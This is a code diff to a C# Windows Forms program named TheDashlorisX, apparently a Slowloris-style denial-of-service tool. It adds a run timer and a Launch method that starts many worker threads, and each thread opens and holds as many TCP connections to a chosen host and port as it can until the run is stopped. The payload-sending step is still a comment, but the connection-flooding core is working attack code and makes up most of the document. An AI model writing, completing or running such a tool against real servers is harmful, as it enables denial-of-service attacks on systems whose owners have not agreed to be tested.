@@ -10,6 +10,7 @@ using System.Text;
 using System.Drawing;
 using System.Threading;
 using System.Collections;
+using System.Net.Sockets;
 using System.Windows.Forms;
 using System.Collections.Generic;
 
@@ -204,9 +205,8 @@ namespace TheDashlorisX
 
 		Print("No errors found! proceeding with execution ....");
 
-		//---: Pass configuration to attack method in here.
-		//---: In attack method, start treating the configuration
-		//---: sets based on tier wise order.
+		// Check if Workers < Max Connections
+		//
 
 		Artillery.Launch(this, SprucyLog);
 	    }
@@ -220,11 +220,35 @@ namespace TheDashlorisX
 
 	public class DashArtillery
 	{
-	    private void StartDurationCounter()
+	    private readonly DashNet DashNet = new DashNet();
+
+
+	    private readonly System.Timers.Timer Timer = new System.Timers.Timer()
+	    {
+		AutoReset = false,
+		Interval = 0001,
+		Enabled = false
+	    };
+
+	    private void StartDurationCounter(int Duration, SpruceLog Logy)
 	    {
 		try
 		{
+		    if (Timer.Interval == 0001)
+		    {
+			Timer.Elapsed += (s, e) =>
+			{
+			    Logy.SendLog("Timer finished 'Dashlorising' the given host!", true);
+			    Logy.SendLog("Give me a moment to catch my breath ....");
 
+			    Logy.KeepStressing = false;
+			};
+		    }
+
+		    Timer.Interval = Duration;
+		    Timer.Enabled = true;
+
+		    Timer.Start();
 		}
 
 		catch (Exception E)
@@ -237,7 +261,12 @@ namespace TheDashlorisX
 	    {
 		try
 		{
+		    Timer.Interval = 0000;
+		    Timer.Enabled = false;
 
+		    Timer.Stop();
+
+		    Thread.Sleep(1000);//To add some breathing.
 		}
 
 		catch (Exception E)
@@ -246,21 +275,118 @@ namespace TheDashlorisX
 		}
 	    }
 
-	    public void Launch(AttaccLog Inst, SpruceLog Logy)
+
+	    private readonly List<Thread> DashWorkers = new List<Thread>();
+
+	    Socket GetSocket(string host, int port)
 	    {
 		try
 		{
-		    StartDurationCounter();
+		    return (new Socket(DashNet.GetAddressFamily(host), SocketType.Stream, ProtocolType.Tcp)
+			{ LingerState = new LingerOption(true, 0), Ttl = 255, SendTimeout = 0, ReceiveTimeout = 0, NoDelay = true });
+		}
 
-		    while (Logy.KeepStressing)
+		catch (Exception E)
+		{
+		    throw (ErrorHandler.GetException(E));
+		}
+	    }
+
+	    public void Launch(AttaccLog Inst, SpruceLog Logy, (string, int, int, string) Tier1, (int, int, int, int, bool) Tier2, (List<string>, List<string>) Tier3)
+	    {
+		try
+		{
+		    StartDurationCounter(Tier1.Item3, Logy);
+
+		    int SendDelay = Tier2.Item1;
+		    int Timeout = Tier2.Item2;
+		    int MaxCons = Tier2.Item4;
+		    int Workers = Tier2.Item3;
+		    int Port = Tier1.Item2;
+
+		    string Host = Tier1.Item1;
+
+		    for (int Worker = 1; Worker <= Workers; Worker += 1)
 		    {
+			DashWorkers.Add(new Thread(() =>
+			{
+			    try
+			    {
+				List<Socket> Connections = new List<Socket>();
 
+				while (Logy.KeepStressing)
+				{
+				    while (Connections.Count < (MaxCons / Workers))
+				    {
+					if (!Logy.KeepStressing)
+					{
+					    break;
+					}
+
+					Socket DashShell = GetSocket(Host, Port);
+
+					var results = DashShell.BeginConnect(Host, Port, null, null);
+					var success = results.AsyncWaitHandle.WaitOne(Timeout);
+
+					if (DashShell.Connected)
+					{
+					    //Send Data
+					    //Update Statistics
+
+					    Connections.Add(DashShell);
+					}
+
+					else
+					{
+					    DashShell.Close();
+					}
+
+					Thread.Sleep(SendDelay);
+				    }
+
+				    // Add background-worker that checks if connections are still live.
+				    // If not, remove entry from list.
+
+				    Thread.Sleep(SendDelay);
+				}
+
+				foreach (Socket Connection in Connections)
+				{
+				    if (Connection.Connected)
+				    {
+					Connection.Disconnect(true);
+				    }
+
+				    Connection.Close();
+				}
+			    }
+
+			    catch (Exception E)
+			    {
+				throw (ErrorHandler.GetException(E));
+			    }
+			}));
 		    }
 
-		    if (!Logy.KeepStressing)
+		    foreach (Thread DashWorker in DashWorkers)
 		    {
-			StopDurationCounter();//Only if Forcibly stopped.
+			DashWorker.IsBackground = true;
+			DashWorker.Start();
 		    }
+
+		    foreach (Thread DashWorker in DashWorkers)
+		    {
+			if (DashWorker.IsAlive)
+			{
+			    DashWorker.Join();
+			}
+		    }
+		    
+		    //DashWorkers.Clear();
+		    // Only gets here if threads are all dead.
+		    // Cleanup here.
+		    
+		    StopDurationCounter();
 		}
 
 		catch (Exception E)
